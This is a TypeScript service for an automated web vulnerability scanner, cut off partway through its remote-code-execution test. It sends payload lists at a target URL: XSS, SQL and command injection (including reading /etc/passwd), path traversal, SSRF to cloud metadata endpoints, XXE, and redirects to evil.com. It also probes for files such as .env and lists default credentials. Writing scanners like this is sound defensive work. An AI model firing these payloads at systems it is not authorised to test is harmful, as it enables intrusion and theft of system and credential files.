import axios from 'axios';
import * as cheerio from 'cheerio';
import https from 'https';

export interface PenetrationTestResult {
  testName: string;
  category: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  vulnerable: boolean;
  description: string;
  evidence?: string;
  payload?: string;
  recommendation: string;
}

export interface PenetrationTestReport {
  url: string;
  testDate: Date;
  testsPerformed: number;
  vulnerabilitiesFound: number;
  results: PenetrationTestResult[];
  riskScore: number;
}

export class PenetrationTestingService {
  private static readonly TIMEOUT = 8000; // Reduced for production compatibility
  private static readonly MAX_REDIRECTS = 3; // Reduced redirects
  
  // Create HTTPS agent with production-safe settings
  private static getHttpsAgent() {
    const isProduction = process.env.NODE_ENV === 'production';
    return new https.Agent({ 
      rejectUnauthorized: !isProduction, // Only allow self-signed in dev
      timeout: this.TIMEOUT,
    });
  }

  /**
   * Perform comprehensive penetration testing
   */
  static async performPenetrationTest(url: string): Promise<PenetrationTestReport> {
    const normalizedUrl = url.startsWith('http') ? url : `https://${url}`;
    const results: PenetrationTestResult[] = [];

    console.log(`Starting penetration test for: ${normalizedUrl}`);
    console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);

    // Run all attack tests with error handling and logging
    const tests = [
      { name: 'XSS', fn: () => this.testXSS(normalizedUrl) },
      { name: 'SQL Injection', fn: () => this.testSQLInjection(normalizedUrl) },
      { name: 'Command Injection', fn: () => this.testCommandInjection(normalizedUrl) },
      { name: 'Path Traversal', fn: () => this.testPathTraversal(normalizedUrl) },
      { name: 'CSRF', fn: () => this.testCSRF(normalizedUrl) },
      { name: 'SSRF', fn: () => this.testSSRF(normalizedUrl) },
      { name: 'Open Redirect', fn: () => this.testOpenRedirect(normalizedUrl) },
      { name: 'XXE', fn: () => this.testXXE(normalizedUrl) },
      { name: 'Security Misconfigurations', fn: () => this.testSecurityMisconfigurations(normalizedUrl) },
      { name: 'Authentication Bypass', fn: () => this.testAuthenticationBypass(normalizedUrl) },
      { name: 'Session Management', fn: () => this.testSessionManagement(normalizedUrl) },
      { name: 'File Upload', fn: () => this.testFileUpload(normalizedUrl) },
      { name: 'LDAP Injection', fn: () => this.testLDAPInjection(normalizedUrl) },
      { name: 'NoSQL Injection', fn: () => this.testNoSQLInjection(normalizedUrl) },
      { name: 'Template Injection', fn: () => this.testTemplateInjection(normalizedUrl) },
      { name: 'XML Injection', fn: () => this.testXMLInjection(normalizedUrl) },
      { name: 'HTTP Header Injection', fn: () => this.testHTTPHeaderInjection(normalizedUrl) },
      { name: 'Host Header Injection', fn: () => this.testHostHeaderInjection(normalizedUrl) },
      { name: 'CRLF Injection', fn: () => this.testCRLFInjection(normalizedUrl) },
      { name: 'Remote Code Execution', fn: () => this.testRemoteCodeExecution(normalizedUrl) },
      { name: 'Deserialization Attacks', fn: () => this.testDeserializationAttacks(normalizedUrl) },
      { name: 'Race Conditions', fn: () => this.testRaceConditions(normalizedUrl) },
      { name: 'Business Logic Flaws', fn: () => this.testBusinessLogicFlaws(normalizedUrl) },
      { name: 'API Vulnerabilities', fn: () => this.testAPIVulnerabilities(normalizedUrl) },
      { name: 'WebSocket Security', fn: () => this.testWebSocketSecurity(normalizedUrl) },
      { name: 'CORS Misconfiguration', fn: () => this.testCORSMisconfiguration(normalizedUrl) },
      { name: 'Clickjacking', fn: () => this.testClickjacking(normalizedUrl) },
      { name: 'DOM-based Vulnerabilities', fn: () => this.testDOMBasedVulnerabilities(normalizedUrl) },
    ];

    // Run tests in batches to avoid timeout issues in production
    const batchSize = 5;
    for (let i = 0; i < tests.length; i += batchSize) {
      const batch = tests.slice(i, i + batchSize);
      console.log(`Running test batch ${Math.floor(i / batchSize) + 1}/${Math.ceil(tests.length / batchSize)}`);
      
      const batchResults = await Promise.allSettled(
        batch.map(async (test) => {
          try {
            console.log(`  - Testing: ${test.name}`);
            const result = await test.fn();
            console.log(`  ✓ ${test.name} completed`);
            return result;
          } catch (error: any) {
            console.error(`  ✗ ${test.name} failed:`, error.message);
            // Return a safe result on error
            return [{
              testName: test.name,
              category: 'Error',
              severity: 'info' as const,
              vulnerable: false,
              description: `Test could not be completed: ${error.message}`,
              recommendation: 'Manual testing recommended.',
            }];
          }
        })
      );

      // Collect results from batch
      batchResults.forEach((result) => {
        if (result.status === 'fulfilled') {
          results.push(...result.value);
        }
      });
    }

    const vulnerabilitiesFound = results.filter(r => r.vulnerable).length;
    const riskScore = this.calculateRiskScore(results);

    console.log(`Penetration test completed. Vulnerabilities found: ${vulnerabilitiesFound}`);

    return {
      url: normalizedUrl,
      testDate: new Date(),
      testsPerformed: results.length,
      vulnerabilitiesFound,
      results,
      riskScore,
    };
  }

  /**
   * Test for XSS vulnerabilities
   */
  private static async testXSS(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];
    
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<svg/onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      '<keygen onfocus=alert("XSS") autofocus>',
      '<video><source onerror="alert(\'XSS\')">',
      '<audio src=x onerror=alert("XSS")>',
      '<details open ontoggle=alert("XSS")>',
      '<marquee onstart=alert("XSS")>',
    ];

    for (const payload of xssPayloads) {
      try {
        // Test in query parameters
        const testUrl = `${url}?q=${encodeURIComponent(payload)}`;
        const response = await axios.get(testUrl, {
          timeout: this.TIMEOUT,
          validateStatus: () => true,
          httpsAgent: this.getHttpsAgent(),
          maxRedirects: this.MAX_REDIRECTS,
        });

        // Check if payload is reflected in response without encoding
        const isReflected = response.data.includes(payload) || 
                          response.data.includes(payload.replace(/"/g, '&quot;'));

        if (isReflected) {
          results.push({
            testName: 'Reflected XSS',
            category: 'Cross-Site Scripting',
            severity: 'critical',
            vulnerable: true,
            description: 'The application reflects user input without proper sanitization, allowing XSS attacks.',
            evidence: `Payload reflected: ${payload}`,
            payload: payload,
            recommendation: 'Implement proper input validation and output encoding. Use Content-Security-Policy headers.',
          });
          break; // Found vulnerability, no need to test more payloads
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    // If no vulnerability found, add info result
    if (results.length === 0) {
      results.push({
        testName: 'Reflected XSS',
        category: 'Cross-Site Scripting',
        severity: 'info',
        vulnerable: false,
        description: 'No reflected XSS vulnerabilities detected in basic tests.',
        recommendation: 'Continue monitoring and testing with more complex payloads.',
      });
    }

    return results;
  }

  /**
   * Test for SQL Injection vulnerabilities
   */
  private static async testSQLInjection(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];
    
    const sqlPayloads = [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "admin' --",
      "admin' #",
      "admin'/*",
      "' or 1=1--",
      "' or 1=1#",
      "' or 1=1/*",
      "') or '1'='1--",
      "') or ('1'='1--",
      "1' ORDER BY 1--+",
      "1' ORDER BY 2--+",
      "1' ORDER BY 3--+",
      "1' UNION SELECT NULL--",
      "1' UNION SELECT NULL,NULL--",
      "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
    ];

    const sqlErrorPatterns = [
      /SQL syntax.*MySQL/i,
      /Warning.*mysql_/i,
      /valid MySQL result/i,
      /MySqlClient\./i,
      /PostgreSQL.*ERROR/i,
      /Warning.*pg_/i,
      /valid PostgreSQL result/i,
      /Npgsql\./i,
      /Driver.*SQL.*Server/i,
      /OLE DB.*SQL Server/i,
      /SQLServer JDBC Driver/i,
      /SqlException/i,
      /Oracle error/i,
      /Oracle.*Driver/i,
      /Warning.*oci_/i,
      /Warning.*ora_/i,
    ];

    for (const payload of sqlPayloads) {
      try {
        const testUrl = `${url}?id=${encodeURIComponent(payload)}`;
        const response = await axios.get(testUrl, {
          timeout: this.TIMEOUT,
          validateStatus: () => true,
          httpsAgent: this.getHttpsAgent(),
        });

        // Check for SQL error messages
        const hasError = sqlErrorPatterns.some(pattern => pattern.test(response.data));

        if (hasError) {
          results.push({
            testName: 'SQL Injection',
            category: 'Injection',
            severity: 'critical',
            vulnerable: true,
            description: 'The application is vulnerable to SQL injection attacks. Database errors are exposed.',
            evidence: 'SQL error messages detected in response',
            payload: payload,
            recommendation: 'Use parameterized queries or prepared statements. Never concatenate user input into SQL queries.',
          });
          break;
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    if (results.length === 0) {
      results.push({
        testName: 'SQL Injection',
        category: 'Injection',
        severity: 'info',
        vulnerable: false,
        description: 'No SQL injection vulnerabilities detected in basic tests.',
        recommendation: 'Continue using parameterized queries and input validation.',
      });
    }

    return results;
  }

  /**
   * Test for Command Injection vulnerabilities
   */
  private static async testCommandInjection(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];
    
    const commandPayloads = [
      '; ls',
      '| ls',
      '& ls',
      '; dir',
      '| dir',
      '& dir',
      '; cat /etc/passwd',
      '| cat /etc/passwd',
      '& cat /etc/passwd',
      '; whoami',
      '| whoami',
      '& whoami',
      '`ls`',
      '$(ls)',
      '; sleep 5',
      '| sleep 5',
      '& sleep 5',
    ];

    for (const payload of commandPayloads) {
      try {
        const testUrl = `${url}?cmd=${encodeURIComponent(payload)}`;
        const startTime = Date.now();
        
        const response = await axios.get(testUrl, {
          timeout: this.TIMEOUT,
          validateStatus: () => true,
          httpsAgent: this.getHttpsAgent(),
        });

        const responseTime = Date.now() - startTime;

        // Check for command output patterns
        const hasCommandOutput = /root:x:0:0/i.test(response.data) || // /etc/passwd
                                /bin\/bash/i.test(response.data) ||
                                /total \d+/i.test(response.data); // ls output

        // Check for time-based injection (sleep command)
        const isTimeBased = payload.includes('sleep') && responseTime > 4000;

        if (hasCommandOutput || isTimeBased) {
          results.push({
            testName: 'Command Injection',
            category: 'Injection',
            severity: 'critical',
            vulnerable: true,
            description: 'The application is vulnerable to OS command injection attacks.',
            evidence: hasCommandOutput ? 'Command output detected' : `Response delayed by ${responseTime}ms`,
            payload: payload,
            recommendation: 'Never pass user input directly to system commands. Use allowlists and input validation.',
          });
          break;
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    if (results.length === 0) {
      results.push({
        testName: 'Command Injection',
        category: 'Injection',
        severity: 'info',
        vulnerable: false,
        description: 'No command injection vulnerabilities detected in basic tests.',
        recommendation: 'Continue avoiding direct system command execution with user input.',
      });
    }

    return results;
  }

  /**
   * Test for Path Traversal vulnerabilities
   */
  private static async testPathTraversal(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];
    
    const traversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\win.ini',
      '....//....//....//etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..%252F..%252F..%252Fetc%252Fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '..//..//..//etc//passwd',
      '..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd',
    ];

    for (const payload of traversalPayloads) {
      try {
        const testUrl = `${url}?file=${encodeURIComponent(payload)}`;
        const response = await axios.get(testUrl, {
          timeout: this.TIMEOUT,
          validateStatus: () => true,
          httpsAgent: this.getHttpsAgent(),
        });

        // Check for file content patterns
        const hasFileContent = /root:x:0:0/i.test(response.data) || // /etc/passwd
                              /\[extensions\]/i.test(response.data); // win.ini

        if (hasFileContent) {
          results.push({
            testName: 'Path Traversal',
            category: 'Path Traversal',
            severity: 'high',
            vulnerable: true,
            description: 'The application is vulnerable to path traversal attacks, allowing access to arbitrary files.',
            evidence: 'System file content detected in response',
            payload: payload,
            recommendation: 'Validate and sanitize file paths. Use allowlists for file access. Implement proper access controls.',
          });
          break;
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    if (results.length === 0) {
      results.push({
        testName: 'Path Traversal',
        category: 'Path Traversal',
        severity: 'info',
        vulnerable: false,
        description: 'No path traversal vulnerabilities detected in basic tests.',
        recommendation: 'Continue validating file paths and using proper access controls.',
      });
    }

    return results;
  }

  /**
   * Test for CSRF vulnerabilities
   */
  private static async testCSRF(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];

    try {
      const response = await axios.get(url, {
        timeout: this.TIMEOUT,
        httpsAgent: this.getHttpsAgent(),
      });

      const $ = cheerio.load(response.data);
      const forms = $('form');

      let vulnerableForms = 0;
      forms.each((_, form) => {
        const method = $(form).attr('method')?.toLowerCase();
        const hasCSRFToken = $(form).find('input[name*="csrf"], input[name*="token"], input[name="_token"]').length > 0;
        
        if (method === 'post' && !hasCSRFToken) {
          vulnerableForms++;
        }
      });

      if (vulnerableForms > 0) {
        results.push({
          testName: 'CSRF Protection',
          category: 'CSRF',
          severity: 'high',
          vulnerable: true,
          description: `Found ${vulnerableForms} form(s) without CSRF token protection.`,
          evidence: `${vulnerableForms} vulnerable form(s)`,
          recommendation: 'Implement CSRF tokens for all state-changing operations. Use SameSite cookie attribute.',
        });
      } else {
        results.push({
          testName: 'CSRF Protection',
          category: 'CSRF',
          severity: 'info',
          vulnerable: false,
          description: 'Forms appear to have CSRF protection or no forms detected.',
          recommendation: 'Ensure CSRF tokens are properly validated on the server side.',
        });
      }
    } catch (error) {
      results.push({
        testName: 'CSRF Protection',
        category: 'CSRF',
        severity: 'info',
        vulnerable: false,
        description: 'Could not test CSRF protection.',
        recommendation: 'Manual testing recommended.',
      });
    }

    return results;
  }

  /**
   * Test for SSRF vulnerabilities
   */
  private static async testSSRF(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];
    
    const ssrfPayloads = [
      'http://localhost',
      'http://127.0.0.1',
      'http://169.254.169.254/latest/meta-data/', // AWS metadata
      'http://metadata.google.internal/computeMetadata/v1/', // GCP metadata
      'http://[::1]',
      'http://0.0.0.0',
    ];

    for (const payload of ssrfPayloads) {
      try {
        const testUrl = `${url}?url=${encodeURIComponent(payload)}`;
        const response = await axios.get(testUrl, {
          timeout: this.TIMEOUT,
          validateStatus: () => true,
          httpsAgent: this.getHttpsAgent(),
        });

        // Check for internal service responses
        const hasInternalResponse = response.data.includes('ami-id') || // AWS metadata
                                   response.data.includes('instance-id') ||
                                   response.data.includes('computeMetadata') ||
                                   /localhost|127\.0\.0\.1/i.test(response.data);

        if (hasInternalResponse) {
          results.push({
            testName: 'Server-Side Request Forgery (SSRF)',
            category: 'SSRF',
            severity: 'critical',
            vulnerable: true,
            description: 'The application is vulnerable to SSRF attacks, allowing access to internal resources.',
            evidence: 'Internal service response detected',
            payload: payload,
            recommendation: 'Validate and sanitize URLs. Use allowlists for external requests. Block access to internal IPs.',
          });
          break;
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    if (results.length === 0) {
      results.push({
        testName: 'Server-Side Request Forgery (SSRF)',
        category: 'SSRF',
        severity: 'info',
        vulnerable: false,
        description: 'No SSRF vulnerabilities detected in basic tests.',
        recommendation: 'Continue validating URLs and blocking internal IP ranges.',
      });
    }

    return results;
  }

  /**
   * Test for Open Redirect vulnerabilities
   */
  private static async testOpenRedirect(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];
    
    const redirectPayloads = [
      'https://evil.com',
      '//evil.com',
      '/\\evil.com',
      'https://evil.com@legitimate.com',
    ];

    for (const payload of redirectPayloads) {
      try {
        const testUrl = `${url}?redirect=${encodeURIComponent(payload)}`;
        const response = await axios.get(testUrl, {
          timeout: this.TIMEOUT,
          maxRedirects: 0,
          validateStatus: () => true,
          httpsAgent: this.getHttpsAgent(),
        });

        const locationHeader = response.headers['location'];
        if (locationHeader && (locationHeader.includes('evil.com') || locationHeader.startsWith('//'))) {
          results.push({
            testName: 'Open Redirect',
            category: 'Open Redirect',
            severity: 'medium',
            vulnerable: true,
            description: 'The application is vulnerable to open redirect attacks.',
            evidence: `Redirects to: ${locationHeader}`,
            payload: payload,
            recommendation: 'Validate redirect URLs against an allowlist. Use relative URLs when possible.',
          });
          break;
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    if (results.length === 0) {
      results.push({
        testName: 'Open Redirect',
        category: 'Open Redirect',
        severity: 'info',
        vulnerable: false,
        description: 'No open redirect vulnerabilities detected in basic tests.',
        recommendation: 'Continue validating redirect destinations.',
      });
    }

    return results;
  }

  /**
   * Test for XXE vulnerabilities
   */
  private static async testXXE(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];
    
    const xxePayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>`;

    try {
      const response = await axios.post(url, xxePayload, {
        headers: { 'Content-Type': 'application/xml' },
        timeout: this.TIMEOUT,
        validateStatus: () => true,
        httpsAgent: this.getHttpsAgent(),
      });

      if (/root:x:0:0/i.test(response.data)) {
        results.push({
          testName: 'XML External Entity (XXE)',
          category: 'XXE',
          severity: 'critical',
          vulnerable: true,
          description: 'The application is vulnerable to XXE attacks.',
          evidence: 'File content retrieved via XXE',
          payload: xxePayload,
          recommendation: 'Disable external entity processing in XML parsers. Use less complex data formats like JSON.',
        });
      }
    } catch (error) {
      // XXE test failed
    }

    if (results.length === 0) {
      results.push({
        testName: 'XML External Entity (XXE)',
        category: 'XXE',
        severity: 'info',
        vulnerable: false,
        description: 'No XXE vulnerabilities detected or XML endpoint not found.',
        recommendation: 'If using XML, ensure external entities are disabled.',
      });
    }

    return results;
  }

  /**
   * Test for security misconfigurations
   */
  private static async testSecurityMisconfigurations(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];

    // Test for common sensitive files
    const sensitiveFiles = [
      '/.git/config',
      '/.env',
      '/config.php',
      '/web.config',
      '/.htaccess',
      '/phpinfo.php',
      '/admin',
      '/backup.sql',
      '/database.sql',
      '/.DS_Store',
    ];

    for (const file of sensitiveFiles) {
      try {
        const testUrl = `${url}${file}`;
        const response = await axios.get(testUrl, {
          timeout: this.TIMEOUT,
          validateStatus: (status) => status === 200,
          httpsAgent: this.getHttpsAgent(),
        });

        if (response.status === 200) {
          results.push({
            testName: 'Sensitive File Exposure',
            category: 'Security Misconfiguration',
            severity: 'high',
            vulnerable: true,
            description: `Sensitive file accessible: ${file}`,
            evidence: `File found at: ${testUrl}`,
            recommendation: 'Remove or restrict access to sensitive files and directories.',
          });
        }
      } catch (error) {
        // File not accessible, which is good
      }
    }

    if (results.length === 0) {
      results.push({
        testName: 'Sensitive File Exposure',
        category: 'Security Misconfiguration',
        severity: 'info',
        vulnerable: false,
        description: 'No common sensitive files found.',
        recommendation: 'Continue protecting sensitive files and directories.',
      });
    }

    return results;
  }

  /**
   * Test for authentication bypass
   */
  private static async testAuthenticationBypass(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];

    // Test for default credentials
    const defaultCreds = [
      { username: 'admin', password: 'admin' },
      { username: 'admin', password: 'password' },
      { username: 'admin', password: '123456' },
      { username: 'root', password: 'root' },
      { username: 'test', password: 'test' },
    ];

    // This is a basic test - in real scenarios, you'd need to know the login endpoint
    results.push({
      testName: 'Default Credentials',
      category: 'Authentication',
      severity: 'info',
      vulnerable: false,
      description: 'Default credential testing requires knowledge of login endpoints.',
      recommendation: 'Ensure default credentials are changed and strong password policies are enforced.',
    });

    return results;
  }

  /**
   * Test session management
   */
  private static async testSessionManagement(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];

    try {
      const response = await axios.get(url, {
        timeout: this.TIMEOUT,
        httpsAgent: this.getHttpsAgent(),
      });

      const cookies = response.headers['set-cookie'] || [];
      let hasInsecureCookie = false;
      let hasHttpOnlyCookie = false;
      let hasSameSiteCookie = false;

      cookies.forEach((cookie: string) => {
        if (!cookie.includes('Secure')) hasInsecureCookie = true;
        if (cookie.includes('HttpOnly')) hasHttpOnlyCookie = true;
        if (cookie.includes('SameSite')) hasSameSiteCookie = true;
      });

      if (cookies.length > 0 && hasInsecureCookie) {
        results.push({
          testName: 'Insecure Cookie Configuration',
          category: 'Session Management',
          severity: 'medium',
          vulnerable: true,
          description: 'Cookies are set without Secure flag.',
          evidence: 'Cookies missing security attributes',
          recommendation: 'Set Secure, HttpOnly, and SameSite flags on all cookies.',
        });
      } else {
        results.push({
          testName: 'Cookie Security',
          category: 'Session Management',
          severity: 'info',
          vulnerable: false,
          description: 'Cookie security appears properly configured or no cookies set.',
          recommendation: 'Continue using secure cookie attributes.',
        });
      }
    } catch (error) {
      results.push({
        testName: 'Session Management',
        category: 'Session Management',
        severity: 'info',
        vulnerable: false,
        description: 'Could not test session management.',
        recommendation: 'Manual testing recommended.',
      });
    }

    return results;
  }

  /**
   * Test file upload vulnerabilities
   */
  private static async testFileUpload(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];

    // This requires finding upload endpoints
    results.push({
      testName: 'File Upload Security',
      category: 'File Upload',
      severity: 'info',
      vulnerable: false,
      description: 'File upload testing requires knowledge of upload endpoints.',
      recommendation: 'Validate file types, scan uploads for malware, and store files outside web root.',
    });

    return results;
  }

  /**
   * Test LDAP Injection
   */
  private static async testLDAPInjection(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];
    
    const ldapPayloads = [
      '*',
      '*)(&',
      '*)(uid=*))(|(uid=*',
      'admin)(&(password=*))',
      '*))(|(cn=*',
    ];

    for (const payload of ldapPayloads) {
      try {
        const testUrl = `${url}?username=${encodeURIComponent(payload)}`;
        const response = await axios.get(testUrl, {
          timeout: this.TIMEOUT,
          validateStatus: () => true,
          httpsAgent: this.getHttpsAgent(),
        });

        if (response.data.includes('LDAP') || response.data.includes('directory')) {
          results.push({
            testName: 'LDAP Injection',
            category: 'Injection',
            severity: 'high',
            vulnerable: true,
            description: 'Application may be vulnerable to LDAP injection.',
            evidence: 'LDAP-related content detected',
            payload: payload,
            recommendation: 'Use parameterized LDAP queries and input validation.',
          });
          break;
        }
      } catch (error) {
        // Continue
      }
    }

    if (results.length === 0) {
      results.push({
        testName: 'LDAP Injection',
        category: 'Injection',
        severity: 'info',
        vulnerable: false,
        description: 'No LDAP injection vulnerabilities detected.',
        recommendation: 'If using LDAP, ensure proper input sanitization.',
      });
    }

    return results;
  }

  /**
   * Test NoSQL Injection
   */
  private static async testNoSQLInjection(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];
    
    const nosqlPayloads = [
      '{"$gt":""}',
      '{"$ne":null}',
      '{"$regex":".*"}',
      '{"$where":"1==1"}',
      '[$ne]=1',
      '{"username":{"$ne":null},"password":{"$ne":null}}',
    ];

    for (const payload of nosqlPayloads) {
      try {
        const testUrl = `${url}?filter=${encodeURIComponent(payload)}`;
        const response = await axios.get(testUrl, {
          timeout: this.TIMEOUT,
          validateStatus: () => true,
          httpsAgent: this.getHttpsAgent(),
        });

        // Check for MongoDB errors or unexpected data
        if (response.data.includes('MongoError') || 
            response.data.includes('$where') ||
            response.data.includes('CastError')) {
          results.push({
            testName: 'NoSQL Injection',
            category: 'Injection',
            severity: 'critical',
            vulnerable: true,
            description: 'Application is vulnerable to NoSQL injection attacks.',
            evidence: 'NoSQL error or unexpected behavior detected',
            payload: payload,
            recommendation: 'Sanitize user input, use schema validation, avoid $where operator.',
          });
          break;
        }
      } catch (error) {
        // Continue
      }
    }

    if (results.length === 0) {
      results.push({
        testName: 'NoSQL Injection',
        category: 'Injection',
        severity: 'info',
        vulnerable: false,
        description: 'No NoSQL injection vulnerabilities detected.',
        recommendation: 'Continue using proper input validation for NoSQL queries.',
      });
    }

    return results;
  }

  /**
   * Test Template Injection (SSTI)
   */
  private static async testTemplateInjection(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];
    
    const templatePayloads = [
      '{{7*7}}',
      '${7*7}',
      '<%= 7*7 %>',
      '{{config}}',
      '{{self}}',
      '#{7*7}',
      '*{7*7}',
      '${{7*7}}',
      '{{7*\'7\'}}',
    ];

    for (const payload of templatePayloads) {
      try {
        const testUrl = `${url}?name=${encodeURIComponent(payload)}`;
        const response = await axios.get(testUrl, {
          timeout: this.TIMEOUT,
          validateStatus: () => true,
          httpsAgent: this.getHttpsAgent(),
        });

        // Check if template was evaluated (7*7 = 49)
        if (response.data.includes('49') && !payload.includes('49')) {
          results.push({
            testName: 'Server-Side Template Injection (SSTI)',
            category: 'Injection',
            severity: 'critical',
            vulnerable: true,
            description: 'Application is vulnerable to template injection, potentially leading to RCE.',
            evidence: 'Template expression evaluated: 7*7 = 49',
            payload: payload,
            recommendation: 'Never pass user input directly to template engines. Use sandboxed templates.',
          });
          break;
        }
      } catch (error) {
        // Continue
      }
    }

    if (results.length === 0) {
      results.push({
        testName: 'Server-Side Template Injection (SSTI)',
        category: 'Injection',
        severity: 'info',
        vulnerable: false,
        description: 'No template injection vulnerabilities detected.',
        recommendation: 'Avoid passing user input to template engines.',
      });
    }

    return results;
  }

  /**
   * Test XML Injection
   */
  private static async testXMLInjection(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];
    
    const xmlPayload = `<?xml version="1.0"?>
<user>
  <name>admin</name>
  <role>administrator</role>
</user>`;

    try {
      const response = await axios.post(url, xmlPayload, {
        headers: { 'Content-Type': 'application/xml' },
        timeout: this.TIMEOUT,
        validateStatus: () => true,
        httpsAgent: this.getHttpsAgent(),
      });

      if (response.data.includes('administrator') || response.data.includes('admin')) {
        results.push({
          testName: 'XML Injection',
          category: 'Injection',
          severity: 'high',
          vulnerable: true,
          description: 'Application may be vulnerable to XML injection.',
          evidence: 'XML content processed without validation',
          payload: xmlPayload,
          recommendation: 'Validate and sanitize XML input. Use XML schema validation.',
        });
      }
    } catch (error) {
      // XML endpoint not found
    }

    if (results.length === 0) {
      results.push({
        testName: 'XML Injection',
        category: 'Injection',
        severity: 'info',
        vulnerable: false,
        description: 'No XML injection vulnerabilities detected or XML endpoint not found.',
        recommendation: 'If using XML, ensure proper validation and sanitization.',
      });
    }

    return results;
  }

  /**
   * Test HTTP Header Injection
   */
  private static async testHTTPHeaderInjection(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];
    
    const headerPayloads = [
      'test\r\nX-Injected: true',
      'test\nX-Injected: true',
      'test%0d%0aX-Injected: true',
    ];

    for (const payload of headerPayloads) {
      try {
        const testUrl = `${url}?redirect=${encodeURIComponent(payload)}`;
        const response = await axios.get(testUrl, {
          timeout: this.TIMEOUT,
          maxRedirects: 0,
          validateStatus: () => true,
          httpsAgent: this.getHttpsAgent(),
        });

        if (response.headers['x-injected']) {
          results.push({
            testName: 'HTTP Header Injection',
            category: 'Injection',
            severity: 'high',
            vulnerable: true,
            description: 'Application is vulnerable to HTTP header injection.',
            evidence: 'Injected header detected in response',
            payload: payload,
            recommendation: 'Sanitize all user input used in HTTP headers. Remove CRLF characters.',
          });
          break;
        }
      } catch (error) {
        // Continue
      }
    }

    if (results.length === 0) {
      results.push({
        testName: 'HTTP Header Injection',
        category: 'Injection',
        severity: 'info',
        vulnerable: false,
        description: 'No HTTP header injection vulnerabilities detected.',
        recommendation: 'Continue sanitizing user input in HTTP headers.',
      });
    }

    return results;
  }

  /**
   * Test Host Header Injection
   */
  private static async testHostHeaderInjection(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];

    try {
      const response = await axios.get(url, {
        headers: { 'Host': 'evil.com' },
        timeout: this.TIMEOUT,
        validateStatus: () => true,
        httpsAgent: this.getHttpsAgent(),
      });

      if (response.data.includes('evil.com')) {
        results.push({
          testName: 'Host Header Injection',
          category: 'Injection',
          severity: 'medium',
          vulnerable: true,
          description: 'Application reflects the Host header, potentially vulnerable to cache poisoning.',
          evidence: 'Host header reflected in response',
          recommendation: 'Validate Host header against allowlist. Use absolute URLs.',
        });
      }
    } catch (error) {
      // Test failed
    }

    if (results.length === 0) {
      results.push({
        testName: 'Host Header Injection',
        category: 'Injection',
        severity: 'info',
        vulnerable: false,
        description: 'No host header injection vulnerabilities detected.',
        recommendation: 'Continue validating Host header.',
      });
    }

    return results;
  }

  /**
   * Test CRLF Injection
   */
  private static async testCRLFInjection(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];
    
    const crlfPayloads = [
      '%0d%0aSet-Cookie: test=injected',
      '%0aSet-Cookie: test=injected',
      '%0d%0a%0d%0a<script>alert("XSS")</script>',
    ];

    for (const payload of crlfPayloads) {
      try {
        const testUrl = `${url}?param=${payload}`;
        const response = await axios.get(testUrl, {
          timeout: this.TIMEOUT,
          validateStatus: () => true,
          httpsAgent: this.getHttpsAgent(),
        });

        const cookies = response.headers['set-cookie'] || [];
        if (cookies.some((c: string) => c.includes('test=injected'))) {
          results.push({
            testName: 'CRLF Injection',
            category: 'Injection',
            severity: 'high',
            vulnerable: true,
            description: 'Application is vulnerable to CRLF injection, allowing HTTP response splitting.',
            evidence: 'Injected cookie detected',
            payload: payload,
            recommendation: 'Remove CRLF characters from user input. Validate all headers.',
          });
          break;
        }
      } catch (error) {
        // Continue
      }
    }

    if (results.length === 0) {
      results.push({
        testName: 'CRLF Injection',
        category: 'Injection',
        severity: 'info',
        vulnerable: false,
        description: 'No CRLF injection vulnerabilities detected.',
        recommendation: 'Continue removing CRLF characters from user input.',
      });
    }

    return results;
  }

  /**
   * Test Remote Code Execution
   */
  private static async testRemoteCodeExecution(url: string): Promise<PenetrationTestResult[]> {
    const results: PenetrationTestResult[] = [];
    
    const rcePayloads = [
      '; echo "RCE_TEST"',
      '| echo "RCE_TEST"',
      '`echo "RCE_TEST"`',
